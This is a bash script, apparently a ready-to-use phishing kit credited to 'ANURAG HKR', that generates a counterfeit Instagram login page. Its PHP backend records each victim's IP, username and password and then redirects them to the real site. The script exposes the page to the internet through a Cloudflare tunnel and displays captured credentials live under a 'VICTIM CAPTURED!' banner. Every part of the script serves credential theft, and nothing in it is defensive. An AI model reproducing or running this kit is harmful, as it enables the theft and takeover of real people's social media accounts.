#!/bin/bash

# --- 1. USER CONFIGURATION (IMAGE SETTING) ---
# Yahan wo link dalo jo photo tum mobile view me dikhana chahte ho
# Agar change karna hai to is link ko replace kar dena
CUSTOM_IMG="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"

# --- 2. SYSTEM DETECTION & SETUP ---
clear
# Colors
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
Y='\033[1;33m'
P='\033[1;35m'
RESET='\033[0m'

# Check OS (Android or PC)
if [ -d "/data/data/com.termux/files/usr" ]; then
    OS="ANDROID"
    # Auto Install Proot for Mobile
    if ! command -v termux-chroot &> /dev/null; then
        echo -e "${Y}[*] Installing Mobile Drivers...${RESET}"
        pkg install proot resolv-conf -y > /dev/null 2>&1
    fi
    RUNNER="termux-chroot"
else
    OS="PC"
    RUNNER="" # PC needs no chroot
fi

# Cleanup
pkill -f php > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
rm -rf auth/
mkdir -p auth
touch usernames.txt

# --- 3. PREMIUM BANNER ---
clear
echo -e "${Y}"
cat << "EOF"
██████╗ ██████╗  ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔══██╗██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██████╔╝██████╔╝██║   ██║       ██║   ██║   ██║██║   ██║██║     
██╔═══╝ ██╔══██╗██║   ██║       ██║   ██║   ██║██║   ██║██║     
██║     ██║  ██║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
EOF
echo -e "${RESET}"
echo -e "${C}    >>> SYSTEM DETECTED: ${G}$OS ${C}<<<    ${RESET}"
echo -e "${P}    >>> CREATED BY: ANURAG HKR (v5.0) <<<    ${RESET}"
echo -e "${Y}===============================================${RESET}"
echo ""

# --- 4. GENERATE HTML (WITH YOUR CUSTOM IMAGE) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }

/* DESKTOP VIEW */
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }

.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding:20px; }
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; font-weight: 500; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; font-size: 14px; }
.input:focus{ border:1px solid #a8a8a8; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:14px; cursor:pointer; margin-top:5px; font-weight:bold; }
.btn:hover{ background:#1877f2; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor:pointer; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor:pointer; font-weight:bold; font-size:14px; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor:pointer; font-weight:bold; font-size:14px; }
.meta{ text-align:center; margin-top:25px; opacity:.7; font-size:12px; }

/* MOBILE VIEW FIX */
@media(max-width:900px){
    .main{ flex-direction:column; }
    .left{ display:none; } 
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    .card{ width: 100%; max-width: 350px; background: transparent; }
    .card h2 { display: none; } /* Mobile me 'Log in' text aksar nahi hota logo hota hai */
    
    /* Mobile Logo (Optional) */
    .mobile-logo { display: block; margin: 0 auto 40px auto; width: 60px; }
}
@media(min-width:901px){
    .mobile-logo { display: none; }
}
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="$CUSTOM_IMG">
    </div>

    <div class="right">
        <div class="card">
            <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
            <h2>Log in to Instagram</h2>
            
            <form action="login.php" method="POST">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>

            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br><strong style="font-size:14px">Meta</strong></div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 5. PHP BACKEND ---
cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
\$log = "\$ip|\$user|\$pass\n";
file_put_contents("../usernames.txt", \$log, FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. MENU & LOGIC ---
echo -e "${G}[1] Localhost (Offline/WiFi)${RESET}"
echo -e "${G}[2] Cloudflare (WorldWide)${RESET}"
echo ""
echo -ne "${Y}Select Mode: ${RESET}"
read option

if [[ $option == "1" ]]; then
    echo -ne "${C}Enter Port (Default 8080): ${RESET}"
    read port
    port=${port:-8080}
    
    echo -e "${Y}[*] Starting Local Server...${RESET}"
    
    # 127.0.0.1 is safer for Android than 0.0.0.0
    $RUNNER php -S 127.0.0.1:$port -t auth > /dev/null 2>&1 &
    
    sleep 2
    echo -e "${G}[✔] ACTIVE ON: http://127.0.0.1:$port${RESET}"

elif [[ $option == "2" ]]; then
    echo -e "${Y}[*] Configuring Cloudflare...${RESET}"
    
    # Check Binary
    if [ ! -f "cloudflared" ]; then
        echo -e "${C}[*] Downloading Engine...${RESET}"
        ARCH=$(uname -m)
        if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ "$ARCH" == *"x86_64"* ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        else
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi
        chmod +x cloudflared
    fi

    # Start PHP (Using Runner variable for OS compatibility)
    $RUNNER php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
    sleep 2
    
    # Start Cloudflare (Using Runner variable)
    $RUNNER ./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
    
    echo -ne "${C}[*] Generating Link... ${RESET}"
    for i in {1..15}; do
        if [ -f cloud.log ]; then
            LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
            if [ ! -z "$LINK" ]; then
                echo -e "\n\n${G}========================================${RESET}"
                echo -e "${Y} LINK: ${LINK} ${RESET}"
                echo -e "${G}========================================${RESET}"
                break
            fi
        fi
        echo -ne "."
        sleep 2
    done
fi

# --- 7. MONITORING (HACKER STYLE) ---
echo ""
echo -e "${P}[*] WAITING FOR CREDENTIALS...${RESET}"
while true; do
    if [ -f usernames.txt ]; then
        tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
            if [[ ! -z "$ip" ]]; then
                echo -e "${R}╔════════════════════════════════╗${RESET}"
                echo -e "${R}║      VICTIM CAPTURED!          ║${RESET}"
                echo -e "${R}╠════════════════════════════════╣${RESET}"
                echo -e "${G}║ IP   : $ip${RESET}"
                echo -e "${Y}║ USER : $user${RESET}"
                echo -e "${C}║ PASS : $pass${RESET}"
                echo -e "${R}╚════════════════════════════════╝${RESET}"
                echo -e "\a"
            fi
        done
    fi
done
